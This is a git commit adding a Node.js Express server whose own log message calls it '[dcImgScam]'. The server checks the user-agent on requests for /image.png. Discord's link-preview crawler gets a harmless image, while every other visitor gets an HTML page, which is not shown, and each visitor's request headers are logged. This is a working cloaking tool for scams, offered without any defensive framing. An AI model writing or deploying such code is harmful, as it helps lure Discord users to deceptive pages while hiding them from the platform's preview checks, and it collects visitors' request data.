d8dbf1343db60dee7fa3ca9800e2b2de936c6789
FuntyGithub <74513280+FuntyGithub@users.noreply.github.com>
2022-07-12 20:29:59 +0200

    v1.0.0

---
+++ index.js
@@ -0,0 +1,18 @@
+
+// define everything
+const express = require('express');
+const path = require('path');
+
+const app = express();
+
+// 
+app.get('/image.png', (request, response) => {
+
+    if(request.headers['user-agent'].includes('https://discordapp.com')) response.sendFile(path.join(__dirname, '/src/image.png'));
+    else response.sendFile(path.join(__dirname, '/src/index.html'));
+
+    console.log(request.headers)
+});
+
+
+app.listen(2002, async (server) => console.log('[dcImgScam] listening on port 2002!'));
